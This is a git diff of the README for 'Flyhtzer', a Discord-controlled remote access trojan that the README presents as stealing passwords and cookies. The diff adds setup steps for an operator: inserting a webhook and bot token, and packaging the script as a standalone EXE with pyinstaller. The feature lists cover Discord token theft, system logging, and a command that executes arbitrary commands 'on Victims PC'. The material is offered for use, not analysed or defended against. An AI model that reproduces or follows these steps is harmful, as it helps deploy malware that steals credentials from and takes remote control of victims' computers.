@@ -4,13 +4,39 @@ Flyhtzer is a Discord Bot/Webhook based Rat stealing passwords cookies and much 
 # Usage
 How to use Flyhtzer:
 
+**open cmd in directory of "Flyhtzer.py"**
+
+**than type**
+
+```bash
+
+pip install -r requirements.txt
+
+```
+
 **Change the SWITCHES to your liking (True/False)**
 
 **Add your webhook on line 156**
 
-**Change the Bot-Token on line 904** *(optional if runrat = False)*
+**Change the Bot-Token on line 904 [Discord developer portal](https://discord.com/developers/applications)** *(optional if runrat = False)*
 
-**Convert Flyhtzer to an EXE** *(optional)*
+**Convert Flyhtzer to an EXE using pyinstaller** *(optional but recommended)*
+
+**(how to conver Flyhtzer.py to exe)**
+
+**open cmd in directory of "Flyhtzer.py"**
+
+**than type**
+
+```bash
+
+pyinstaller --onefile Flyhtzer.py 
+
+```
+
+**wait for the program to finish and you will find your exe in the "dist" folder**
+
+
 
 # Features
 
@@ -38,7 +64,7 @@ How to use Flyhtzer:
       [1] Discord Token
       [2] Account Platform 
     
-**PC Logger** 💻 *(Logs relating to Computer)*
+**PC Logger** 💻 
 
     Basic Information
       [1] Desktop Name
@@ -113,7 +139,7 @@ How to use Flyhtzer:
       [3] system       [Gather information on the PC ]
       [4] admin        [Gather information on the PC ]
       [5] misc         [Miscellaneous Commands       ]
-      [6] information  [Information about Flyhtzer  ]
+      [6] information  [Information about Flyhtzer   ]
 
     Shell Commands (Execute shell-like commands and control all files)
       [1] cmd <command> <embed/file>    [Executes Custom Command on Victims PC ]
@@ -149,4 +175,4 @@ How to use Flyhtzer:
       [1] showdb                        [Display all records in your Database     ]
       [2] cleardb                       [Clear all logs in your Database          ]
       [3] switches                      [Displays all switch values (True/False)  ]
-      [4] credits                       [Displays credits for Flyhtzer (me lol)  ]
+      [4] credits                       [Displays credits for Flyhtzer (me lol)   ]
